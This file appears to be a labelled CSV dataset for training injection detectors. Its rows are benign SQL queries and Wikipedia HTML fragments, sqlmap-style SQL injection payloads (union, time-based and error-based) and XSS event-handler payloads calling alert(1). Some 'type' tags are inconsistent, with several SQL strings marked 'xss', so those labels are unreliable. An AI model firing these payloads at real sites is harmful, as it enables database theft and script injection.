Text,Label,type
SELECT * FROM voyage WHERE pair NOT LIKE 'stream%',0,sql
1'   )    )    as pgif where 6346  =  6346,1,sql
"<li id=""cite_note-384""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-384"">^ </a> </b> ",0,xss
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",2,xss
"1%""  )   union all select null,null,null,null,null,null#",1,sql
1689,0,sql
"-5825  )   as mflf where 3999  =  3999 or make_set  (  1492  =  7153,7153  )  --",1,sql
"<pre oncontextmenu=""alert(1)"">test</pre>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Müller, Vincent C.; Bostrom, Nick (2014). <a rel=""nofollow"" class=""external text"" href=""http://www.sophia.de/pdf/2014_PT-AI_polls.pdf"">""Future Progress in Artificial Intelligence: A Poll Among Experts"" </a> <span class=""cs1-format"">(PDF) ",0,xss
palacios de riopisuerga,0,sql
"-6731"" where 6166  =  6166 union all select 6166,6166,6166,6166,6166,6166--",1,sql
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://betanews.com/2016/10/21/artificial-intelligence-stephen-hawking/"">""Stephen Hawking believes AI could be mankind's last accomplishment"" </a>. <i>BetaNews </i>. 21 October 2016. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20170828183930/https://betanews.com/2016/10/21/artificial-intelligence-stephen-hawking/"">Archived </a> from the original on 28 August 2017. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=BetaNews&amp;rft.atitle=Stephen+Hawking+believes+AI+could+be+mankind%27s+last+accomplishment&amp;rft.date=2016-10-21&amp;rft_id=https%3A%2F%2Fbetanews.com%2F2016%2F10%2F21%2Fartificial-intelligence-stephen-hawking%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"santa clara, 111, 4?h",0,sql
"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",1,sql
"  SELECT * FROM blow WHERE draw IN  ( 'brown', 'coming', 'biggest' )  ",0,sql
93289880v,0,sql
brittani,0,sql
"    <link rel=""next"" title=""Scrapy at a glance"" href=""intro/overview.html"" /> ",0,xss
"        <nav data-toggle=""wy-nav-shift"" class=""wy-nav-side"">",0,xss
"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",1,xss
"1%""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,1,sql
SELECT * FROM move 3,0,sql
"<p>In the hospitality industry, Artificial Intelligence based solutions are used to reduce staff load and increase efficiency<sup id=""cite_ref-336"" class=""reference""><a href=""#cite_note-336"">&#91;325&#93; </a> </sup> by cutting repetitive tasks frequency, trends analysis, guest interaction, and customer needs prediction.<sup id=""cite_ref-337"" class=""reference""><a href=""#cite_note-337"">&#91;326&#93; </a> </sup> Hotel services backed by Artificial Intelligence are represented in the form of a chatbot,<sup id=""cite_ref-338"" class=""reference""><a href=""#cite_note-338"">&#91;327&#93; </a> </sup> application, virtual voice assistant and service robots.",0,xss
SELECT DISTINCT lay FROM paid,0,sql
 UPDATE rubber SET instead = 'brain'WHERE spite = 'coach',0,sql
SELECT nearest ( s FROM apartment RIGHT JOIN,0,sql
1'+  (  select 'yahq' where 6974  =  6974 union all select null--,1,sql
"<meta name=""generator"" content=""MediaWiki 1.35.0-wmf.22""/>",0,xss
"1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"1  )   where 7600  =  7600 union all select null,null,null,null,null,null--",1,sql
"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,sql
SELECT poet ( s )  FROM question,0,sql
"1"" order by 1--",1,sql
"<ruby oncut=""alert(1)"" contenteditable>test</ruby>",2,xss
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",1,sql
"<div draggable=""true"" ondragleave=""alert(1)"">test</div>",2,xss
metrics,0,sql
</div>,0,xss
"<p onclick=""alert(1)"">test</p>",2,xss
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></label>",2,xss
"<dfn onmousedown=""alert(1)"">test</dfn>",2,xss
<bgsound onpointerout=alert(1)>XSS</bgsound>,2,xss
SELECT land,0,sql
80937614q,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=image-net.org&amp;rft.atitle=ILSVRC2017&amp;rft_id=http%3A%2F%2Fimage-net.org%2Fchallenges%2FLSVRC%2F2017%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li><a href=""/wiki/Automata_theory"" title=""Automata theory"">Automata theory </a> </li>",0,xss
select   (  case when   (  4994  =  1572  )   then 4994 else 4994*  (  select 4994 from mysql.db  )   end  )  #,1,sql
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",1,sql
1'  )   and 7533  =  7533,1,sql
SELECT TOP 3 * FROM structure WHERE oldest = 'needs',0,xss
"-5196""   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""gbcq"" like ""gbcq",1,sql
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,1,xss
SELECT * FROM did WHERE body = 'pound'  AND  ( pour = 'original' OR tank = 'course' ) ,0,xss
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""qcqx"" like ""qcqx",1,xss
"calle hernandez iglesias, 160,",0,sql
"<tbody oncopy=""alert(1)"" contenteditable>test</tbody>",2,xss
"-4044%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""%""  =  """,1,xss
"1""  )   where 9656  =  9656 and sleep  (  5  )  --",1,sql
"<strike onclick=""alert(1)"">test</strike>",2,xss
SELECT * FROM tree WHERE most BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1'+  (  select immd where 7499  =  7499 union all select null,null,null,null,null,null,null,null#",1,sql
iza,0,sql
bebedizo,0,sql
"<address onmouseenter=""alert(1)"">test</address>",2,xss
"-9318""   )    )     )   union all select 5223,5223,5223,5223#",1,sql
-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,sql
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve,1,sql
7310,0,sql
	 </span> ,0,xss
SELECT * FROM cost WHERE century BETWEEN kept09/01/1996meal AND smile15/31/1996forward,0,sql
37724,0,sql
"1%"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""%""  =  """,1,sql
ardie9temente,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
51285362p,0,sql
"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",1,xss
"-2125""   )    )    or 8571  =  8571--",1,sql
"<blink onmouseout=""alert(1)"">test</blink>",2,xss
SELECT * FROM support WHERE court = 'youth' FETCH FIRST 3 ROWS ONLY,0,sql
"<li><a href=""/wiki/Operating_system"" title=""Operating system"">Operating system </a> </li>",0,xss
"<q onkeydown=""alert(1)"" contenteditable>test</q>",2,xss
1' and 2006  =  2006,1,sql
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",1,sql
SELECT around ( s )  FROM court SELECT work FROM pipe,0,sql
<noframes onpointerover=alert(1)>XSS</noframes>,2,xss
SELECT AVG ( poet ) FROM spin,0,sql
"<button draggable=""true"" ondragstart=""alert(1)"">test</button>",2,xss
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,xss
SELECT you ( s )  FROM own UNION ALL,0,sql
-4324 order by 1--,1,sql
"concejo de alzuza, 47,",0,sql
"   SELECT service, simplest, pushFROM possibly WHERE cover  IS NOT NULL",0,sql
SELECT * FROM month FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM dollar,0,xss
"<style>:target {color: red;}</style><link id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></link>",2,xss
cuerva,0,sql
SELECT * FROM breathing,0,sql
 </li>,0,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=16"" title=""Edit section: Symbolic"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",1,sql
1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,1,sql
 </p>,0,xss
"<summary onmouseover=""alert(1)"">test</summary>",2,xss
"INSERT INTO solution ( swung, pencil, cup, welcome, those, unhappy )  VALUES  ( 'impossible', 'pen'. title', 'weak', 'front', 'judge', 'sets' )  ",0,sql
SELECT * FROM adjective WHERE Price NOT BETWEEN 10 AND 20,0,xss
"1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'khah' like 'khah",1,sql
<marquee id=x tabindex=1 onbeforeactivate=alert(1)></marquee>,2,xss
"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
SELECT COUNT ( DISTINCT equator )  FROM manufacturing,0,sql
"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",1,xss
SELECT * FROM while WHERE am IN  ( SELECT stove FROM instance ) ,0,sql
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" ontransitionend=alert(1)></dl>",2,xss
SELECT * FROM goose FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM policeman,0,sql
venialbo,0,sql
"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,sql
lawlik@housemovie.lk,0,sql
melanson,0,sql
"-2612""  )   as iwfj where 3231  =  3231 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,xss
"<font onmousedown=""alert(1)"">test</font>",2,xss
"<li class=""toclevel-3 tocsection-18""><a href=""#Logic-based""><span class=""tocnumber"">5.2.2 ",0,xss
	 </span> </li>,0,xss
scheppan-ishikawa@tuslimites.ly,0,sql
1   )    )    as bsvo where 3605  =  3605,1,xss
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></tt>",2,xss
"-8026 or elt  (  8434  =  4516,4516  )  # bsqo",1,sql
SELECT AVG ( chart ) FROM floor SELECT SUM ( truth ) ,0,sql
<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>,2,xss
"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",1,sql
"<td onmousedown=""alert(1)"">test</td>",2,xss
SELECT TOP 50 PERCENT * FROM bean,0,sql
SELECT * FROM industrial WHERE cross = 'bridge' FETCH FIRST 3 ROWS ONLY,0,sql
SELECT * FROM wonder,0,sql
SELECT * FROM Customers  WHERE CustomerName LIKE 'a__%';,0,sql
41100,0,sql
"<a href=""/wiki/Dreyfus%27_critique_of_artificial_intelligence"" class=""mw-redirect"" title=""Dreyfus&#39; critique of artificial intelligence"">Dreyfus' critique of artificial intelligence </a>:",0,xss
"	 </span> <span class=""reference-text"">",0,xss
"   SELECT pocket, birds, moneyFROM observe WHERE smoke  IS NOT NULL",0,sql
SELECT COUNT ( DISTINCT corner )  FROM finish,0,xss
" SELECT column_name ( s )  FROM no,former",0,sql
SELECT edge ( s )  FROM tree FULL OUTER JOIN,0,sql
sazarina_logue@gay-tantra.lc,0,sql
lavat@ajuntamentbarcelona20.gy,0,sql
"<li onmouseenter=""alert(1)"">test</li>",2,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;335–363, </li>",0,xss
"1""  )   where 6478  =  6478 union all select null,null,null,null,null,null#",1,sql
07951538r,0,sql
	 </span> </li>,0,xss
"	 </span> </a> </i>&#93; </sup>. Many deep learning systems need to be able to learn chains ten or more causal links in length.<sup id=""cite_ref-schmidhuber2015_246-0"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup> Deep learning has transformed many important subfields of artificial intelligence<sup class=""noprint Inline-Template"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/Wikipedia:Please_clarify"" title=""Wikipedia:Please clarify""><span title=""The reason for this is unclear. (July 2019)"">why? ",0,xss
"1%"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""%""  =  """,1,sql
"<meter onbeforecopy=""alert(1)"" contenteditable>test</meter>",2,xss
detlefsen albornoz,0,sql
</dl>,0,xss
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'xqkq'  =  'xqkq",1,sql
masashi,0,sql
"1""",1,sql
"<li><a href=""/wiki/Claude_Bernard"" title=""Claude Bernard"">Claude Bernard </a> </li>",0,xss
medey,0,sql
end-- podi,1,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'qhgp'  =  'qhgp",1,xss
1' in boolean mode  )   order by 1--,1,sql
SELECT religious FROM wish UNION ALL SELECT constantly FROM blood ORDER BY slope,0,xss
5.56194E+15,0,sql
